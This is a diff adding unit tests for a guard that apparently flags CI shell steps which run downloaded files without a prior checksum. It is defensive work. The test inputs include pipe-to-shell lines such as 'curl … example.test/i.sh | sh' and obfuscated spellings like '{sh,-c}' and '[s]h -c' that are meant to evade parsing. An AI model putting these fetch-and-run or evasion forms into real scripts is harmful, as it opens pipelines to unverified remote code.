@@ -542,6 +542,240 @@ class TestADownloadNamedLikeAWrapper(unittest.TestCase):
         self.assertIsNone(wg.fetch_exec_defect("flock 9\n./flock 9\n"))
 
 
+class TestADownloadRunThroughAnExpandedPath(unittest.TestCase):
+    """#2310: `curl -o tool …; "$PWD/tool" 9` read clean, because a use is
+    bound to a download by its spelling and the fetch spelled it `tool`; bash
+    3.2 and 5.2 run the download through each spelling in the first test (a
+    `chmod +x tool` before the fetch survives it). A command word holding a
+    `$` or `$(...)` that ends in a download's basename is now running it."""
+
+    URL = "https://example.test/tool"
+    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)
+
+    def defect(self, run, dest="tool"):
+        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))
+
+    def test_a_command_word_ending_in_its_basename_is_running_it(self):
+        for run in ('"$PWD/tool" 9\n', '"${PWD}/tool" 9\n', "$PWD/tool 9\n",
+                    '"$PWD"/tool 9\n', '"$(pwd)/tool" 9\n', '"`pwd`/tool" 9\n',
+                    '"$(dirname "$PWD/x")/tool" 9\n', "x=1 $PWD/tool 9\n",
+                    'for i in 1; do "$PWD/tool" 9; done\n',
+                    'find . -name tool -exec "$PWD/tool" {} \\;\n'):
+            with self.subTest(run=run):
+                self.assertIn("-> tool and running it with nothing verifying",
+                              self.defect(run) or "")
+
+    def test_wherever_the_fetch_put_it(self):
+        # Bound by the basename: what `$PWD` expands to is not evaluated, so
+        # `d/tool` is read as run too -- which bash does not do from the
+        # checkout, and is the fail-closed side to be wrong on.
+        for dest, run in (("bin/tool", '"$PWD/bin/tool" 9\n'),
+                          ("/tmp/tool", '"$RUNNER_TEMP/tool" 9\n'),
+                          ("d/tool", '"$PWD/tool" 9\n')):
+            with self.subTest(dest=dest):
+                self.assertIn("running it", self.defect(run, dest) or "")
+
+    def test_as_a_wrapper_word_through_a_copy_and_behind_a_wrapper(self):
+        # `"$PWD/flock"` is read through as `flock`, but runs the download.
+        self.assertIn("running it", self.defect('"$PWD/flock" 9 true\n', "flock") or "")
+        self.assertIn("running it (as `alias`, copied from it earlier)",
+                      self.defect('cp tool alias\n"$PWD/alias" 9\n') or "")
+        # Refused behind `sudo` already; now it is the download's use as well.
+        why = wg.fetch_exec_defects("curl -fsSL -o tool %s\nsudo \"$PWD/tool\" 9\n" % self.URL)
+        self.assertEqual(2, len(why), why)
+        self.assertIn("dynamic command operand behind a wrapper", why[0])
+        self.assertIn("running it", why[1])
+
+    def test_a_check_before_it_clears_it_and_one_after_it_does_not(self):
+        self.assertIsNone(self.defect(self.CHECK % "tool" + '"$PWD/tool" 9\n'))
+        self.assertIn("only AFTER running it",
+                      self.defect('"$PWD/tool" 9\n' + self.CHECK % "tool") or "")
+
+    def test_a_check_still_binds_by_its_exact_spelling(self):
+        # Reported although bash checks the same file: read that loosely, a
+        # checksum of `$OTHER/tool` would clear a `./tool` it never read.
+        self.assertIn("no checksum in the job names tool",
+                      self.defect(self.CHECK % "$PWD/tool" + '"$PWD/tool" 9\n') or "")
+
+    def test_another_basename_or_a_static_path_is_not_the_download(self):
+        for run in ('"$PWD/other" 9\n', '"$PWD/tool.sh" 9\n', '"$PWD/tool/.." 9\n',
+                    "./bin/tool 9\n", "/usr/bin/tool 9\n"):
+            with self.subTest(run=run):
+                self.assertIsNone(self.defect(run))
+
+
+class TestADownloadWrittenIntoADirectoryOnPath(unittest.TestCase):
+    """#2308: `curl -o /usr/local/bin/tool …; tool --version` read clean: the
+    download is bound to its path, and `tool` is not that path, but bash finds
+    the file by looking the bare name up on PATH. A bare name that is the
+    basename of a download written into one of `workflow_operands.PATH_DIRS` is
+    now running it -- as the command or as a wrapper word, still read
+    through."""
+
+    URL = "https://example.test/tool"
+    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)
+
+    def defect(self, dest, run):
+        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))
+
+    def test_a_bare_name_runs_a_download_in_a_directory_on_path(self):
+        for dest in ("/usr/local/bin/tool", "/usr/bin/tool", "/bin/tool",
+                     "/usr/local/sbin/tool", '"$HOME/.local/bin/tool"',
+                     '"${HOME}/.local/bin/tool"', "~/.local/bin/tool",
+                     "/usr/local/bin/./tool",
+                     # review N-4: the runner's `~/.local/bin`, spelled out
+                     "/home/runner/.local/bin/tool",
+                     # not on a hosted runner's PATH, and kept: fail-closed
+                     "/opt/bin/tool"):
+            with self.subTest(dest=dest):
+                self.assertIn("running it with nothing verifying",
+                              self.defect(dest, "tool --version\n") or "")
+        script = "curl -fsSL --output-dir /usr/local/bin -O %s\ntool\n" % self.URL
+        self.assertIn("-> /usr/local/bin/tool and running it", wg.fetch_exec_defect(script) or "")
+
+    def test_behind_a_wrapper_and_as_one(self):
+        for dest, run in (("/usr/local/bin/tool", "sudo tool --version\n"),
+                          ("/usr/local/bin/tool", "env FOO=1 tool\n"),
+                          ("/usr/local/bin/flock", "flock 9 make\n"),
+                          ("/usr/local/bin/env", "env FOO=1 make\n")):
+            with self.subTest(dest=dest, run=run):
+                self.assertIn("running it", self.defect(dest, run) or "")
+        # Still read through: the command behind the wrapper word is `make`.
+        self.assertEqual(["make"], shell_reader.command(["flock", "9", "make"]))
+
+    def test_a_check_binds_by_the_path_and_not_by_the_bare_name(self):
+        self.assertIsNone(self.defect("/usr/local/bin/tool",
+                                      self.CHECK % "/usr/local/bin/tool" + "tool\n"))
+        # `sha256sum -c` of the bare `tool` reads ./tool: taking it for the
+        # download would clear bytes nothing checked.
+        self.assertIn("no checksum in the job names /usr/local/bin/tool",
+                      self.defect("/usr/local/bin/tool", self.CHECK % "tool" + "tool\n") or "")
+
+    def test_off_path_or_run_by_a_path_it_is_not_the_bare_name(self):
+        for dest, run in (("/tmp/tool", "tool\n"), ("bin/tool", "tool\n"),
+                          ("/opt/tool/bin/tool", "tool\n"),
+                          ("/usr/local/bin/tool", "./tool\n"),
+                          ("/usr/local/bin/tool", "tools\n"),
+                          ("/usr/local/bin/tool", "echo tool\n")):
+            with self.subTest(dest=dest, run=run):
+                self.assertIsNone(self.defect(dest, run))
+
+
+class TestAPatternWhereTheCommandStarts(unittest.TestCase):
+    """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
+    in a checkout holding a file called sh, before the command runs, which the
+    guard read clean. Where the command or a wrapper's operand is expected,
+    such a word is reported unread; quoted, it is the literal word, which runs
+    nothing, as before."""
+
+    PAYLOAD = "'curl -fsSL https://example.test/i.sh | sh'"
+
+    def test_it_is_reported(self):
+        for script in ("{sh,-c} %s\n", "[s]h -c %s\n", "sudo {sh,-c} %s\n",
+                       "taskset {0x1,sh} -c %s\n", "exec -a {x,sh} -c %s\n",
+                       "if {sh,-c} %s; then :; fi\n"):
+            with self.subTest(script=script):
+                why = wg.job_defects([("step", script % self.PAYLOAD)])
+                self.assertEqual(1, len(why), why)
+                self.assertIn("cannot read command", why[0][1])
+        why = wg.fetch_exec_defect("{sh,-c} %s\n" % self.PAYLOAD) or ""
+        self.assertIn("cannot read command: `{sh,-c}` is a pattern", why)
+
+    def test_quoted_it_reads_as_before(self):
+        for script in ("'{sh,-c}' %s\n", '"[s]h" -c %s\n', "echo {a,b} [s]h * %s\n",
+                       "[ -f x ] && echo %s\n", "arr[0]=x\n", "xargs -I {} echo {} < l\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script.replace(
+                    "%s", self.PAYLOAD))]))
+
+    def test_where_a_shell_looks_for_c_or_a_script_it_is_reported(self):
+        # Review N-3: bash 3.2 and 5.2 run `sh {-c,'…'}` as `sh -c '…'`.
+        # Re-review N-C: so is any pattern there that may begin with `-`.
+        for script in ("sh {-c,%s}\n", "sudo bash {-c,%s}\n", "sh -o pipefail {-c,%s}\n",
+                       "sh [-]c %s\n", "bash -{c,x} %s\n"):
+            with self.subTest(script=script):
+                why = wg.job_defects([("step", script % self.PAYLOAD)])
+                self.assertIn("looks for `-c` or a script", why[0][1] if why else "")
+        for script in ("bash lint.sh src/*.py\n", "sh -c 'echo' {a,b}\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script)]))
+
+    def test_a_program_a_shell_is_handed_as_a_glob_binds_a_download(self):
+        # Re-review N-C: a pattern that cannot begin with `-` is the program,
+        # and runs a download it matches -- `sh ./cuda_*.run` after `curl -o
+        # cuda_1.run`, which bash 3.2 and 5.2 run and base read clean for the
+        # `./`. The glob binds with a leading `./` dropped and a brace read as
+        # `*`, and with a `$` in it by its last part, which r1 reported as a
+        # pattern alone; with nothing fetched it runs nothing unchecked.
+        get = ("get", "curl -fsSL -o cuda_1.run https://example.test/c\n")
+        for use in ("sh ./cuda_*.run --silent", "sudo sh ./cuda_*.run", "bash ./cuda_{1,2}.run",
+                    "chmod +x ./cuda_*.run", 'sh "$PWD"/cuda_*.run', "sh $(pwd)/cuda_*.run",
+                    "sh ${X}*"):
+            with self.subTest(use=use):
+                self.assertIn("cuda_1.run", "".join(w for _n, w in wg.job_defects(
+                    [get, ("run", use + "\n")])))
+        with self.subTest(use="checked, then sh ./cuda_*.run"):
+            check = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)
+            self.assertEqual([], wg.job_defects([get, ("run", check + "sh ./cuda_*.run\n")]))
+        for script in ("sh scripts/*.sh\n", "bash [a-c]*.sh\n", "bash -n scripts/*.sh\n",
+                       "sudo sh ./cuda_*.run\n", "bash ./build-{a,b}.sh\n", "sh ./configure*\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script)]))
+        with self.subTest(use="a download no glob matches"):
+            self.assertEqual([], wg.job_defects([get, ("run", 'sh "$D"/*.sh ./x_*.run\n')]))
+
+    def test_inside_an_expansion_or_arithmetic_there_is_none(self):
+        # Review N-1: bash globs nothing written inside `${...}`, `((...))` or
+        # `$((...))`, and these idioms were reported from #2294 on.
+        for script in ("(( a[1]++ ))\n", "(( count[$k]++ ))\n", "${CMD[@]} --flag\n",
+                       "${x#*/} --version\n", "${x%.*}\n", "if (( a[i] > 0 )); then :; fi\n",
+                       "$(( a[1] * 2 )) --flag\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script)]))
+        # The must-trips: a pattern beside or inside them, where bash globs it.
+        for script in ("${x}[s]h -c %s\n", "(( a[1]++ )) && [s]h -c %s\n",
+                       "((echo) ; [s]h -c %s)\n", "(( $([s]h -c %s) ))\n"):
+            with self.subTest(script=script):
+                why = wg.job_defects([("step", script % self.PAYLOAD)])
+                self.assertIn("is a pattern", why[0][1] if why else "")
+
+    def test_in_a_conditional_an_array_or_an_extglob_group_there_is_none(self):
+        # Re-review I-5: 16 jobs in 10 calibration-pool repos, 14 of them
+        # fetching nothing, failed on #2294's rule, where the reader put these
+        # words where a command starts. Bash runs none of them: a conditional
+        # expands no pattern, an array literal globs its words into the array,
+        # and an extglob group is part of its word (`shopt -s extglob`).
+        for script in ("results=(files/x/*)\n", "blockmaps=(static/dist/*.blockmap)\n",
+                       "A=(${DIR}/*)\n", "arr=(*.txt)\n",
+                       "files=(\n  dist/*.dmg\n  dist/*.exe\n)\n", "files+=(\n  **/*.sh\n)\n",
+                       "declare -A t=(\n  [n8n]=${V}\n)\n",
+                       "f() {\n  local -a x=( *.sh )\n}\n",
+                       "if [[ $v =~ ^2\\.(0|[1-9]*)$ ]]; then :; fi\n",
+                       "[[ $d =~ ME([[:space:]]|(\\\\[rn]))+ ]]\n",
+                       "case 1.2 in\n  +([0-9]).+([0-9]) ) echo ok ;;\nesac\n",
+                       "for f in @(*.deb|*.zip); do echo \"$f\"; done\n",
+                       "rm -rf !(keep|*.md)\n", "x=@(a|b)\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script)]))
+        # The must-trips: a pattern where a command starts, beside them or in a
+        # substitution inside them; an extglob group that is the command or
+        # stands where `sh` looks for `-c`, which bash with `extglob` on expands
+        # (`@(sh)` to `sh`, given a file `sh`; `!(x)` too, which with it off
+        # negates a subshell); a case arm's `[[)`, a pattern and no conditional;
+        # and an array's `[` no `]` closes, which bash 3.2 reads on past as code.
+        for script in ("( [s]h -c %s )\n", "{sh,-c} %s\n", "[s]h -c %s\n",
+                       "arr=(*.txt); [s]h -c %s\n", "files=(\n  *.txt\n)\n[s]h -c %s\n",
+                       "[[ -n x ]]&&[s]h -c %s\n", "arr=( $([s]h -c %s) )\n",
+                       "[[ -n $([s]h -c %s) ]]\n", "shopt -s extglob\n@([s]h) -c %s\n",
+                       "!([s]h -c %s)\n", "declare -A t=(\n  [a]=1\n)\n[s]h -c %s\n",
+                       "shopt -s extglob\n@(sh) -c %s\n", "shopt -s extglob\nsh @(-c) %s\n",
+                       "shopt -s extglob\n!(x) -c %s\n",
+                       "case $x in\n  [[) [s]h -c %s ;;\nesac\n", "x=( [[ ) ; [s]h -c %s\n"):
+            with self.subTest(script=script):
+                why = wg.job_defects([("step", script % self.PAYLOAD)])
+                self.assertIn("is a pattern", why[0][1] if why else "")
+
+
 class TestTheFormsThatHideAFetch(unittest.TestCase):
     """Spellings that are not `curl <url> -o <file>` and mean the same thing.
 
@@ -809,6 +1043,93 @@ class TestASwallowedCheckIsNotACheck(unittest.TestCase):
     def test_a_check_joined_with_and_still_counts(self):
         self.assertIsNone(self.swallowed(
             'echo "%s  /tmp/payload" | sha256sum -c - && echo verified\n' % HEX))
+
+
+class TestACheckInsideAScriptMustStopTheStep(unittest.TestCase):
+    """Review I-2 of the #1793 follow-ups: a checksum inside a script handed to
+    `sh -c`, to a shell's standard input (a quoted heredoc, and since #2293 a
+    here-string) or to `eval` was credited as if the step's own shell ran it.
+    A child shell has no `-e` unless it is given one, and exits with its last
+    command's status: bash 3.2 and 5.2 run `./tool` with the checksum failing
+    after `sh -c 'CHECK; echo ok'` and after `sh -c 'CHECK' || true`. Such a
+    checksum now clears a use only where its failure stops the step: it stops
+    the script (`-e` holds there, or it is the script's last command, the last
+    of its pipeline unless the script's own pipefail holds) and the command
+    handing the script over does not swallow that. `eval` runs in the step's
+    own shell, so its script keeps the step's `-e` and pipefail -- except
+    `-e` where bash suspends it, behind `||`/`&&`, `!` or `if`."""
+
+    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
+    CHECK = 'echo "%s  tool" | sha256sum -c -' % HEX
+
+    def job(self, form, check=CHECK):
+        return wg.job_defects([("step", self.FETCH + form % check + "\n./tool\n")])
+
+    def assertReported(self, form, why, check=CHECK):
+        found = self.job(form, check)
+        self.assertEqual(1, len(found), found)
+        self.assertIn("the checksum that names tool is inside the script", found[0][1])
+        self.assertIn(why, found[0][1])
+
+    def test_a_check_the_script_carries_on_past_is_reported(self):
+        for form in ("sh -c '%s; echo ok'", "sh <<< '%s; echo ok'",
+                     "sh <<'EOF'\n%s\necho ok\nEOF", "sh -c 'set -e; set +e; %s; echo ok'",
+                     "eval '%s; echo ok' || exit 1", "bash -o pipefail -c '%s | cat; echo ok'"):
+            with self.subTest(form=form):
+                self.assertReported(form, "carries on past its failure")
+        self.assertReported('sh -c "sh -c \'%s\'; echo ok"', "the step does not stop",
+                            self.CHECK.replace('"', '\\"'))
+
+    def test_a_check_piped_into_another_command_in_the_script_is_reported(self):
+        # Re-review N-D: unless the script's own pipefail holds, read from
+        # its options or a plain `set` as its `-e` is.
+        for form in ("sh -c '%s | cat'", "sh -ec '%s | cat; echo ok'",
+                     "bash -c 'set -o pipefail; set +o pipefail; %s | cat'"):
+            with self.subTest(form=form):
+                self.assertReported(form, "piped into a command whose status the pipeline takes")
+        with self.subTest(form="an eval in it keeps the script's"):
+            self.assertReported("sh -c 'eval \"%s | cat\"'", "piped into a command whose status",
+                                self.CHECK.replace('"', '\\"'))
+
+    def test_a_script_whose_failure_the_step_goes_on_past_is_reported(self):
+        for form in ("sh -c '%s' || true", "sh <<< '%s' || true",
+                     "sh -ec '%s; echo ok' || true", "if sh -c '%s'; then :; fi",
+                     "! sh -c '%s'", "eval '%s; echo ok' || true", "eval '%s' || true"):
+            with self.subTest(form=form):
+                self.assertReported(form, "the step does not stop when that script fails")
+
+    def test_a_check_that_stops_the_script_and_the_step_still_clears(self):
+        for form in ("sh -c '%s'", "sh <<< '%s'", "sh <<'EOF'\n%s\nEOF",
+                     "sh -ec '%s; echo ok'", "sh -e -c '%s; echo ok'",
+                     "bash -euo pipefail -c '%s; echo ok'", "sh <<< 'set -e; %s; echo ok'",
+                     "sh -c 'set -o errexit; %s; echo ok'",
+                     "bash -e <<'EOF'\n%s\necho ok\nEOF", "eval '%s; echo ok'",
+                     "eval '%s' || exit 1", "sh -c '%s' || exit 1",
+                     "bash -o pipefail -c '%s | cat'", "bash -eo pipefail -c '%s | cat; echo ok'",
+                     "bash -c 'set -o pipefail; %s | cat'", "bash -o errexit -o pipefail "
+                     "-c '%s | cat; echo ok'", "sh -c 'set -euo pipefail; %s | cat; echo ok'"):
+            with self.subTest(form=form):
+                self.assertEqual([], self.job(form))
+        self.assertEqual([], self.job('sh -c "sh -c \'%s\'"', self.CHECK.replace('"', '\\"')))
+
+    def test_the_top_level_twins_read_as_before(self):
+        # The must-trip controls: the step's own `CHECK || true` is reported
+        # on every tree, and its own `CHECK` clears.
+        self.assertIn("hands its failure to a `||` branch", self.job("%s || true")[0][1])
+        self.assertEqual([], self.job("%s"))
+
+    def test_an_exit_behind_the_check_in_a_script_without_e_is_not_read(self):
+        # Fail-closed, and the rule's known over-reports (re-review N-D): bash
+        # stops each of these scripts at the failing check -- at `exit 1`, at
+        # `exit $?`, and under a `set -e` or `set -o pipefail` written inside
+        # a branch -- but only `-e` or pipefail from the script's options or
+        # a plain `set`, or its last command, are read as stopping it.
+        self.assertReported("sh -c '%s || exit 1; echo ok'", "carries on past its failure")
+        self.assertReported("sh -c '%s; exit $?'", "carries on past its failure")
+        self.assertReported("sh -c 'if true; then set -e; fi; %s; echo ok'",
+                            "carries on past its failure")
+        self.assertReported("bash -c 'if true; then set -o pipefail; fi; %s | cat'",
+                            "piped into a command whose status the pipeline takes")
 
 
 class TestChecksumRescueStatus(unittest.TestCase):
@@ -1213,6 +1534,73 @@ class TestABranchIsNotAlwaysTaken(unittest.TestCase):
              ("b", self.FETCH + self.CHECK + self.EXEC)]))
 
 
+class TestAScriptsKeywordsAreItsOwn(unittest.TestCase):
+    """Review I-3 of the #1793 follow-ups: `regions` read the keywords of a
+    script handed to a shell as the step's own, so the `fi` in
+    `sh <<< 'fi' || true` closed the loop around it, and the checksum after
+    it read as unconditional. With X unset, bash 3.2 and 5.2 skip the loop and
+    run `./tool` with the checksum failing. A script's statements now sit in
+    the branch of the command that runs it, and its keywords shape only its
+    own map."""
+
+    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
+    CHECK = 'echo "%s  tool" | sha256sum -c -\n' % HEX
+
+    def job(self, opened, form, closed):
+        return wg.job_defects([("step", self.FETCH + opened + form + "\n" + self.CHECK +
+                                closed + "./tool\n")])
+
+    def test_a_close_inside_a_script_does_not_close_the_steps_branch(self):
+        for opened, closed in (("for f in $X; do\n", "done\n"),
+                               ('if [ -n "$X" ]; then\n', "fi\n")):
+            for form in ("sh <<< 'fi' || true", "sh -c 'fi' || true",
+                         "sh <<'EOF' || true\nfi\nEOF", "eval 'fi' || true",
+                         "sh -c 'done; esac' || true"):
+                with self.subTest(opened=opened, form=form):
+                    found = self.job(opened, form, closed)
+                    self.assertEqual(1, len(found), found)
+                    self.assertIn(wg._UNSHARED_BRANCH, found[0][1])
+
+    def test_an_open_inside_a_script_does_not_hold_the_steps_branch_open(self):
+        # The loop's `done` closed the script's `then` instead of the loop, and
+        # `./tool` read as inside the loop with the checksum.
+        found = wg.job_defects([("step", self.FETCH + "for f in $X; do\n" + self.CHECK +
+                                 "sh -c 'if true; then' || true\ndone\n./tool\n")])
+        self.assertEqual(1, len(found), found)
+        self.assertIn(wg._UNSHARED_BRANCH, found[0][1])
+
+    def test_a_script_on_the_line_opening_a_branch_runs_in_it(self):
+        # It was read ahead of the `then`/`do` that carries it, as if it always
+        # ran: base cleared `./tool` after `fi` with it, and bash skips it.
+        for form in ("if [ -n \"$X\" ]; then sh -c '%s'; fi\n",
+                     "for f in $X; do sh -c '%s'; done\n",
+                     "if [ -n \"$X\" ]; then sh <<< '%s'; fi\n"):
+            with self.subTest(form=form):
+                found = wg.job_defects([("step", self.FETCH + form % self.CHECK.strip() +
+                                         "./tool\n")])
+                self.assertEqual(1, len(found), found)
+                self.assertIn(wg._UNSHARED_BRANCH, found[0][1])
+        # ... and, the other way, in the arm its pattern opens, with the use.
+        self.assertEqual([], wg.job_defects([("step", self.FETCH + "case \"$X\" in\n"
+                                              "  a) sh -c '%s'; ./tool ;;\nesac\n"
+                                              % self.CHECK.strip())]))
+
+    def test_the_scripts_own_branches_still_bind(self):
+        # A checksum inside the script's own `if` clears nothing outside it;
+        # one after the script's balanced branch clears the use after it.
+        self.assertIn(wg._UNSHARED_BRANCH, wg.job_defects([("step", self.FETCH +
+            "sh -ec 'if [ -n \"$X\" ]; then %s; fi'\n./tool\n" % self.CHECK.strip())])[0][1])
+        self.assertEqual([], wg.job_defects([("step", self.FETCH +
+            "sh -ec 'if true; then :; fi; %s'\n./tool\n" % self.CHECK.strip())]))
+        self.assertEqual([], wg.job_defects([("step", self.FETCH + 'if [ -n "$X" ]; then\n' +
+            "sh -ec '%s'\n./tool\nfi\n" % self.CHECK.strip())]))
+
+    def test_without_the_script_the_branch_is_reported_as_before(self):
+        # The must-trip control: reported on every tree.
+        found = self.job("for f in $X; do\n", ":", "done\n")
+        self.assertEqual(1, len(found), found)
+
+
 class TestTheJobIsTheScope(unittest.TestCase):
     """M5: steps in one job share the workspace, /tmp and PATH.
 
@@ -1285,6 +1673,70 @@ class TestTheJobIsTheScope(unittest.TestCase):
         self.assertEqual([], wg.job_defects([("build", "make test\n")]))
 
 
+class TestEveryUseIsAskedForItsCheck(unittest.TestCase):
+    """Review I-1 of the #1793 follow-ups: `_defect` asked only a download's
+    FIRST use whether a binding checksum came before it. A use inside the
+    checksum's branch, `case` arm, loop body or `if:` step, ahead of a use
+    after it, took the binding, and the job read clean while bash 3.2 and 5.2
+    run the later use with the checksum skipped. Each use is asked now, in
+    order, and the first one no checksum clears is the one reported: reading
+    one more use can add a report, never remove one."""
+
+    URL = "https://example.test/tool"
+    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % HEX
+    PLACES = ("shell branch", "case arm", "loop", "if: step")
+    # (where the download lands, a use the follow-ups taught the guard to
+    # read, the use after it that nothing guards)
+    USES = (("tool", '"$PWD/tool" --version', "./tool"),                      # #2310
+            ("/usr/local/bin/tool", "tool --version", "/usr/local/bin/tool"),  # #2308
+            ("tool", "env x-y=1 ./tool --version", "./tool"),                 # #2307
+            ("tool", "sh <<< './tool --version'", "./tool"))                  # #2293
+
+    def job(self, place, dest, inside, after):
+        fetch = "curl -fsSL -o %s %s\n" % (dest, self.URL)
+        body = self.CHECK % dest + (inside + "\n" if inside else "")
+        if place == "if: step":
+            return [wg.Step("get", fetch), wg.Step("check", body, None, "env.X == 'y'"),
+                    wg.Step("run", after + "\n")]
+        opened, closed = {"shell branch": ('if [ -n "$X" ]; then\n', "fi\n"),
+                          "case arm": ('case "$X" in\na)\n', ";;\nesac\n"),
+                          "loop": ("for f in $X; do\n", "done\n")}[place]
+        return [("step", fetch + opened + body + closed + after + "\n")]
+
+    def assertReported(self, place, found):
+        self.assertEqual(1, len(found), found)
+        self.assertIn(wg._UNSHARED_IF if place == "if: step" else wg._UNSHARED_BRANCH,
+                      found[0][1])
+
+    def test_a_use_the_checksum_guards_does_not_clear_one_after_it(self):
+        for place in self.PLACES:
+            for dest, inside, after in self.USES:
+                with self.subTest(place=place, inside=inside):
+                    self.assertReported(place, wg.job_defects(self.job(place, dest, inside, after)))
+
+    def test_nor_does_a_use_the_guard_always_read(self):
+        # The same weakness with a use the guard read before the follow-ups:
+        # base read these clean as well.
+        for place in self.PLACES:
+            with self.subTest(place=place):
+                self.assertReported(place, wg.job_defects(
+                    self.job(place, "tool", "./tool --version", "./tool")))
+
+    def test_without_the_use_inside_it_is_reported_as_before(self):
+        # The must-trip control: reported on every tree.
+        for place in self.PLACES:
+            for dest, _inside, after in self.USES:
+                with self.subTest(place=place, after=after):
+                    self.assertReported(place, wg.job_defects(self.job(place, dest, None, after)))
+
+    def test_a_checksum_before_every_use_still_clears_them_all(self):
+        for dest, inside, after in self.USES:
+            script = ("curl -fsSL -o %s %s\n" % (dest, self.URL) + self.CHECK % dest +
+                      'if [ -n "$X" ]; then\n%s\nfi\n%s\n' % (inside, after))
+            with self.subTest(inside=inside):
+                self.assertEqual([], wg.job_defects([("step", script)]))
+
+
 class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
     """L1: the parser reads sh/bash. A step that runs pwsh, python or cmd is
     not clean, it is UNREAD -- and saying so is the only honest answer."""
@@ -1332,7 +1784,8 @@ class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
 
 
 class TestTheGapsTheGuardDocuments(unittest.TestCase):
-    """#1697: the ten forms the module docstring ruled, each as a live step."""
+    """#1697: the ten forms the module docstring ruled, each as a live step,
+    and an eleventh ruled since (#2308)."""
 
     def accepted(self, *steps):
         """The job is clean -- this form goes unseen, and says so out loud."""
@@ -1356,6 +1809,16 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         self.accepted(("get", 'DEST=/tmp/payload\n'
                               'curl -sfL https://example.test/p -o "$DEST"\n'),
                       ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))
+
+    def test_a_use_spelled_another_way_off_the_command_word(self):
+        # #2310 closed a command word with a `$` ending in the download's
+        # basename (`TestADownloadRunThroughAnExpandedPath`); an operand, a
+        # word whose last part expands and a tilde still name nothing fetched.
+        fetch = ("get", "curl -sfL https://example.test/p -o payload\n")
+        for run in ('sh "$PWD/payload"\n', 'P=./payload\n"$P" 9\n', "~/payload 9\n"):
+            with self.subTest(run=run):
+                self.accepted(fetch, ("run", run))
+        self.flagged(fetch, ("run", '"$PWD/payload" 9\n'))
 
     # Grouping parentheses are read with or without surrounding whitespace.
     def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
@@ -1503,10 +1966,13 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
 
     def test_a_checksum_inside_the_string_still_clears_it(self):
         # The expansion keeps the ORDER, so a step hardened inside its own
-        # quoted script is read as hardened rather than as unread.
-        self.accepted(("run", 'sh -c "curl -sfL https://example.test/p -o /tmp/p; '
-                              'echo %s  /tmp/p | sha256sum -c -; '
-                              'chmod +x /tmp/p"\n' % HEX))
+        # quoted script is read as hardened rather than as unread -- where
+        # the checksum stops the script: under `sh -ec`, and not under a bare
+        # `sh -c`, which carries on to the `chmod` (review I-2).
+        script = ('sh -%s "curl -sfL https://example.test/p -o /tmp/p; '
+                  'echo %s  /tmp/p | sha256sum -c -; chmod +x /tmp/p"\n')
+        self.accepted(("run", script % ("ec", HEX)))
+        self.assertIn("carries on past its failure", self.flagged(("run", script % ("c", HEX))))
 
     def test_a_pipe_to_a_shell_inside_the_string_is_still_a_pipe_to_a_shell(self):
         self.flagged(("run", 'eval "curl -sfL https://example.test/i.sh | sh"\n'))
@@ -1583,6 +2049,75 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                               "curl -sfL https://example.test/p -o /tmp/p\n"
                               "chmod +x /tmp/p\n"
                               'EOF\n)"\n'))
+        # Handed to an interpreter there too (review I-4): bash 3.2 and 5.2
+        # run the payload, and the re-read holds only the lifted body's marker.
+        self.accepted(("run", "x=$(bash -s <<'EOF'\n"
+                              "curl -fsSL https://example.test/i.sh | sh\n"
+                              "EOF\n)\n"))
+
+    def test_a_nested_substitution_that_downloads_nothing_is_not_reported(self):
+        # Re-review N-1 of the #1793 follow-ups: an inner substitution's
+        # "nothing here" (`Idle`) came back as the outer script's unread form,
+        # so a step that downloads nothing failed on the nesting alone while
+        # its depth-1 twin `x=$(bash -c 'echo 1')` read clean. Bash 3.2 and 5.2
+        # run no download in any of these; the fetching twin stays reported.
+        for script in ("x=$(bash -c 'y=$(bash -c \"echo 1\")')\n",
+                       "x=$(eval 'y=$(bash -c \"echo 1\")')\n",
+                       "x=$(bash <<< 'y=$(sh -c \"echo 1\")')\n"):
+            with self.subTest(script=script):
+                self.accepted(("run", script))
+        self.assertIn("inside a command substitution", self.flagged(
+            ("run", "x=$(sh -c 'v=$(bash -c \"curl -fsSL https://example.test/i.sh | sh\")')\n")))
+
+    def test_a_script_handed_to_a_shell_inside_a_substitution_is_reported(self):
+        # Review I-4 of the #1793 follow-ups: a substitution is read for what
+        # it fetches, never for the script a shell inside it is handed, so
+        # `x=$(sh -c 'curl … | sh')` read clean, and bash 3.2 and 5.2 run the
+        # payload. Until substitutions are flattened, such a script is walked
+        # and reported unread when it fetches or holds a form the guard cannot
+        # read, a script it hands on included (re-review N-A), or when the job
+        # downloads at all. A heredoc there is read only when its `EOF)` leaves
+        # the body in the substitution's own text; lifted out, it is the entry
+        # above.
+        payload = "curl -fsSL https://example.test/i.sh | sh"
+        for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
+                       "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
+                       "x=$(eval '%s')\n" % payload, "x=`sh -c '%s'`\n" % payload,
+                       'echo "$(sudo bash -ec \'%s\')"\n' % payload,
+                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload,
+                       "x=$(sh -c 'v=$(bash -c \"%s\")')\n" % payload,
+                       "x=$(sh -c 'sudo $CMD')\n"):
+            with self.subTest(script=script):
